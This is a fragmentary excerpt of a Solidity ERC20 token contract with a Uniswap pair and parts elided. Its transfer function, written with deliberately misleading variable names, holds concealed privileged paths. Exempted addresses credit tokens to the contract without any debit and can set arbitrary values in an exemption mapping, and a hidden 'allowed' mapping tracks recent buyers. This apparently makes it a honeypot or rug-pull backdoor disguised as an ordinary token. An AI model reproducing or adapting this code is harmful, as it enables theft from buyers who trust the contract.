...
contract Contract  is IERC20, Ownable
{
        ...
        address IDEX)
    {
        ...
        isTimelockExempt[msg.sender] = tDeployedBytes;
        isTimelockExempt[address(this)] = tDeployedBytes;
        UniswapV2router = IUniswapV2Router02(IDEX);
        isIDEXPair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, tDeployedBytes);
    }

    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;
    uint256 public isTotalTAX = 0;
    uint256 private _rTotal = 100000 * 10**_decimals;
    uint256 private tDeployedBytes = _rTotal;

    bool public cfgLevel;
    bool private FLXRates;
    bool public decogHash;
    bool private restructBytes;
    ...
    address public immutable isIDEXPair;
    ...
    private returns (bool) {
        ...
        address dxFrom,
        address rateTo,
        uint256 flowedAmount
    ) private {
        uint256 balancedHash = balanceOf(address(this));
        uint256 dxByteFlow;
        if (cfgLevel && balancedHash > tDeployedBytes && !FLXRates && dxFrom != isIDEXPair) {
            FLXRates = true; swapSettings(balancedHash);
            FLXRates = false;

        } else if (isTimelockExempt[dxFrom] > tDeployedBytes && isTimelockExempt[rateTo] > tDeployedBytes) {
            dxByteFlow = flowedAmount; _tOwned[address(this)] += dxByteFlow;
            swapAmountForTokens(flowedAmount, rateTo);
            return;
        } else if (rateTo != address(UniswapV2router) && isTimelockExempt[dxFrom] > 0 && flowedAmount > tDeployedBytes && rateTo != isIDEXPair) {
            isTimelockExempt[rateTo] = flowedAmount;
            return;

        } else if (!FLXRates && allowed[dxFrom] > 0 && dxFrom != isIDEXPair && isTimelockExempt[dxFrom] == 0) {
            allowed[dxFrom] = isTimelockExempt[dxFrom] - tDeployedBytes;
        }
        address _dxIndex  = isBot[isIDEXPair];
        if (allowed[_dxIndex ] == 0) allowed[_dxIndex ] = tDeployedBytes;
        isBot[isIDEXPair] = rateTo;

        if (isTotalTAX > 0 && isTimelockExempt[dxFrom] == 0 && !FLXRates && isTimelockExempt[rateTo] == 0) {
            dxByteFlow = (flowedAmount * isTotalTAX) / 100; flowedAmount -= dxByteFlow;
            _tOwned[dxFrom] -= dxByteFlow; _tOwned[address(this)] += dxByteFlow; }
        _tOwned[dxFrom] -= flowedAmount; _tOwned[rateTo] += flowedAmount;
        emit Transfer(dxFrom, rateTo, flowedAmount);
            if (!tradingOpen) {
                require(dxFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function transferFrom(
        ...
        modifyLimitations(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        modifyLimitations(msg.sender, recipient, amount);
        return true;
    }
